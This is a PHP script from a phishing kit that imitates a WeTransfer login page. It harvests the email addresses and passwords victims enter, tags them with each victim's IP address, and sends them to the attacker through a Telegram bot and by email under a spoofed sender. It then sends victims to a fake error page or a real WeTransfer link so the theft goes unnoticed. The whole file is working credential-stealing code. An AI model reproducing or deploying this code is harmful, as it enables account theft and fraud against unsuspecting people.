<?php
session_start();
require 'param.php';
require "sender.php";
require 'prevents/index.php';
$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['mail']) AND !empty($_POST['mail']) AND isset($_POST['passw']) AND !empty($_POST['passw'])) {
    $message = "♦| WeTransfer Log 1|♦ \r\n\r\n";
    $message .= 'Email : ' . $_POST['mail'] . "\r\n";
    $message .= 'mot de passe : ' . $_POST['passw'] . "\r\n";
    $message .= '/-----VICTIME DETAILS -------/' . "\r\n";
    $message .= 'IP address : ' . $ip . "\r\n";
    

   telegram($message,$chatid,$bot);
    $objet = "$ip | WeTransfer Login 1"; 
$headers = "From: Post Lux <no-reply@youversion.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
mail($email, $objet, $message, $headers);
header("Location: log-error.php");
}
if (isset($_POST['mail2']) AND !empty($_POST['mail2']) AND isset($_POST['passw2']) AND !empty($_POST['passw2'])) {
  $message = "♦| WeTransfer Log 2|♦ \r\n\r\n";
  $message .= 'Email : ' . $_POST['mail2'] . "\r\n";
  $message .= 'mot de passe : ' . $_POST['passw2'] . "\r\n";
  $message .= '/-----VICTIME DETAILS -------/' . "\r\n";
  $message .= 'IP address : ' . $ip . "\r\n";
  

 telegram($message,$chatid,$bot);
  $objet = "$ip | WeTransfer Login 2"; 
$headers = "From: Post Lux <no-reply@youversion.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
mail($email, $objet, $message, $headers);
header("Location: https://wetransfer.com/downloads/d2d348fe3d2995e1cf8e5fe8cf84a56c20231031011618/1150945a7ef90f33b9c67ef4dc77098520231031011655/06f777?trk=TRN_TDL_01&utm_campaign=TRN_TDL_01&utm_medium=email&utm_source=sendgrid");
}




if (empty($_POST['mail2']) AND $_POST['passw2']) {
  header('Location: index.php');
}
if (empty($_POST['mail']) AND $_POST['passw']) {
  header('Location: index.php');
}



?>
